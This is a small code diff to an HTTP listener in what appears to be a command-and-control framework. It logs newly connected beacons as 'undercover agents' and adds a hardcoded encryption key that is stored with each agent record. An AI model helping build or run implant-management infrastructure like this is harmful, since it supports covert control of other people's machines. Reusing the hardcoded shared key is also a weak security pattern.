@@ -17,6 +17,7 @@ class HTTP_listener:
         self.port = port
 
         self.stash = stash
+        self.key = 'CIpAysYcPFRXEtalHHsll4_uQsG4vSQXwWhyoywDwnc' 
 
         ## to fix
         html_fold = '/home/blu/Documents/projectz/wtf_another_c2/core/html/'
@@ -36,13 +37,13 @@ class HTTP_listener:
             beacon_type = request.form.get("type")
 
             success(f'New undercover agent {beacon_name}.')
-            fields = (beacon_name, self.name, beacon_ip, beacon_hostname, beacon_type)
-            self.stash.sql_stash( """INSERT INTO agents(agent_name, \
-                                                        listener_name, \
-                                                        remote_ip, \
-                                                        hostname, \
-                                                        beacon_type, \
-                                                        enc_key ) VALUES( ?, ?, ?, ?, ?, ? )""", fields )
+            fields = (beacon_name, self.name, beacon_ip, beacon_hostname, beacon_type, self.key)
+            self.stash.sql_stash( """INSERT INTO agents( agent_name, \
+                                                         listener_name, \
+                                                         remote_ip, \
+                                                         hostname, \
+                                                         beacon_type, \
+                                                         enc_key ) VALUES( ?, ?, ?, ?, ?, ? )""", fields )
             return (beacon_name, 200)
         
         @self.app.errorhandler(404)
